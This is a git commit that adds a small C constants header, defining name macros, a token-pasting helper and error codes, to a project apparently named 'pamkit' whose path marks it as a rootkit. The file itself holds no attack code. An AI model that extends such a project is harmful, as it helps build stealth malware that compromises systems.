4580a33b01b442f7a73210465a661e409a8180ab
arm1nt <armin.nikbakht@gmail.com>
2025-08-06 20:11:35 +0200

    Add utility file defining constants

---
+++ rootkit/util/constants.h
@@ -0,0 +1,12 @@
+#ifndef _PAMKIT_CONSTANTS_H
+#define _PAMKIT_CONSTANTS_H
+
+#define PAMKIT_NAME "pamkit"
+#define PAMKIT_NAME_TOKEN pamkit
+#define PREPEND_PAMKIT_TOKEN(val) pamkit##_##val
+
+/* Internal error codes */
+#define PAMKIT_SUCCESS 0
+#define PAMKIT_ERROR 1
+
+#endif /* _PAMKIT_CONSTANTS_H */
